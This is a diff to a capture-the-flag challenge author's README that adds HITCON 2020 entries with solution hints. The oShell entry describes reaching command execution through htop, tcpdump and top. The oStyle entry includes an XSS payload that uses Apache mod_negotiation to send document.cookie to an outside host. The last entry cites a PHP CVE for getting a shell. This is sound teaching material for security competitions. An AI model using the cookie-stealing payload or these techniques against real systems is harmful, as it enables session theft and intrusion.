@@ -24,6 +24,11 @@ And you can find me via:
 
 ## **Table of Content**
 
+* [HITCON 2020](#oShell)
+    * [oShell](#oShell)
+    * [oStyle](#oStyle)
+    * [Return of Use-After-Flee](#return-of-use-after-flee)
+
 * [HITCON 2019 Quals](#virtual-public-network)
     * [Virtual Public Network](#virtual-public-network)
     * [Bounty Pl33z](#bounty-pl33z)
@@ -71,6 +76,83 @@ And you can find me via:
     * [SQLPWN](#sqlpwn)
     
 <br>
+
+## **oShell**
+  
+Difficulty: **★★**  
+Solved: **21 / 1281**  
+Tag:   **BlackBox**, **Shell** ,**Command Injection**  
+
+#### Source Code
+
+* [Source](hitcon-ctf-2020/oShell/)  
+
+#### Solution
+
+1. Leveraging `strace` in `htop` to read enable secret.
+2. Writing `/home/oShell/.toprc` with `tcpdump -w`
+3. Abusing `top` inspect feature to run arbitrary commands
+
+
+#### Write Ups
+
+* [Writeup from team FrenchRoomba](https://github.com/FrenchRoomba/ctf-writeup-HITCON-CTF-2020/tree/master/oShell)  
+
+
+## **oStyle**
+  
+Difficulty: **★★☆**  
+Solved: **10 / 1281**  
+Tag:   **XSS**
+
+#### Source Code
+
+* [Source](hitcon-ctf-2020/oStyle/)  
+
+#### Solution
+
+* The default Apache installation enabled `mod_negotiation`, which allows `.var` mapping and you can specify arbitrary content-type there.
+
+**test.var**
+```
+Content-language: en
+Content-type: text/html
+Body:----foo----
+
+<script>
+fetch('http://orange.tw/?' + escape(document.cookie))
+</script>
+
+----foo----
+
+```
+
+
+#### Write Ups
+
+* TBD
+
+
+## **Return of Use-After-Flee**
+  
+Difficulty: **★★★★★**  
+Solved: **0 / 1281**  
+Tag: **WhiteBox**, **PHP**, **UAF**, **PWN**  
+
+#### Source Code
+
+* [Source](hitcon-ctf-2020/return-of-use-after-flee/)  
+
+#### Solution
+
+* Exploiting `CVE-2015-0273` to pop the shell without known binaries. More detail will be published in [my blog](http://blog.orange.tw/) soon.
+
+
+#### Write Ups
+
+* TBD
+
+
 
 ## **Virtual Public Network**
   
